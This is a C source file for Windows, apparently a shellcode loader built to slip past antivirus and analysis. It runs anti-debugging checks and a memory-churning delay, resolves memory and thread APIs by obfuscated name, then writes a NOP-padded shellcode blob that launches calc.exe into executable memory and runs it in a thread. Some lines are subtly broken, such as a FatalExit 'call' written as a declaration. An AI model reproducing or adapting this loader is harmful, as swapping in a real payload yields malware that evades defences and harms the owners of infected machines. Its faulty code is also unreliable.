#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <random>

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateThread_t)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);

unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};
unsigned char sCreateThread[] = {'C','r','e','a','t','e','T','h','r','e','a','d',0x0,};


int __cdecl main(VOID) {
	//Begin anti-debugging
	BOOL  bDebuggerPresent;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent); //check for remote debugger, store result in bDebuggerPresent
	__analysis_noreturn int FatalExit(1); //if in a debugger, return control to debugger
	DebugActiveProcessStop(GetCurrentProcessId()); //if in a debugger, end own process
	
	//Request and interatively use a bunch of memory
	int i = 100000000;
	int n = 0;
	char * buffer;
	buffer = (char*) malloc (i+1);
	
	for (n=0; n<i; n++)
	  buffer[n]=rand()%26+'a';
	buffer[i]='\0';
	
	if (buffer==NULL) exit (1);
	free (buffer);
	
	
	if (!(IsDebuggerPresent() || bDebuggerPresent)){ //One final check before we get into the juicey stuff, check if local debugger OR remote debugger
		
		void * exec_mem;
		BOOL rv;
		HANDLE th;
		DWORD oldprotect = 0;
		
		//function pointers
		VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sVirtualAlloc);
		VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sVirtualProtect);
		CreateThread_t CreateThread_p = (CreateThread_t) GetProcAddress(GetModuleHandle((LPCSTR) "kErnEl32.DLl"), (LPCSTR) sCreateThread);
		
		//custom calc payload
		unsigned char payload[] = { 0x90, 0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8, 0x90, 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x31, 0xd2, 0x90, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x31, 0xc0, 0x90, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x83, 0xf8, 0x0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0xff, 0xc9, 0x90, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x59, 0x41, 0x59, 0x5e, 0x59, 0x5a, 0x41, 0x59, 0x41, 0x59, 0x41, 0x59, 0x48, 0x83, 0xec, 0x20, 0x41, 0x51, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x6, 0x1, 0x0, 0x0, 0x41, 0xba, 0x30, 0x8b, 0x6f, 0x87, 0x41, 0xff, 0xc2, 0xff, 0xd5, 0xbb, 0xef, 0xb5, 0xa2, 0x56, 0xff, 0xc3, 0x41, 0xba, 0xa5, 0x95, 0xbd, 0x9d, 0x41, 0xff, 0xc2, 0x90, 0x90, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 };
		unsigned int payload_len = sizeof(payload);
		
		// Allocate a memory buffer for payload
		exec_mem = VirtualAlloc_p(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		// Copy payload to program memory ; this gets inlined
		RtlMoveMemory(exec_mem, payload, payload_len);
		
		// Make payload executable
		rv = VirtualProtect_p(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

		printf("\nLaunch Payload?\n");
		getchar();

		// Run payload
		if ( rv != 0 ) {
				th = CreateThread_p(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
				Sleep(1000);
				//Use sleep instead of WaitForSingleObject(th, INFINITE);
		}
		
	}
	
	

	return 0;
}